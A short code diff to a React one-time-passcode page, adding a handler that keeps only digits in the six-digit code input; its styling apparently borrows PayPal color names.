@@ -12,6 +12,12 @@ export const Link3Page = (): JSX.Element => {
   const [otpValue, setOtpValue] = useState("");
   const [rememberDevice, setRememberDevice] = useState(true);
 
+  const handleOtpChange = (value: string) => {
+    // Only allow digits
+    const digitsOnly = value.replace(/\D/g, '');
+    setOtpValue(digitsOnly);
+  };
+
   // Footer links data
   const footerLinks = [
     {
@@ -69,7 +75,7 @@ export const Link3Page = (): JSX.Element => {
               <InputOTP
                 maxLength={6}
                 value={otpValue}
-                onChange={setOtpValue}
+                onChange={handleOtpChange}
               >
                 <InputOTPGroup className="flex gap-1 sm:gap-2">
                   <InputOTPSlot index={0} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
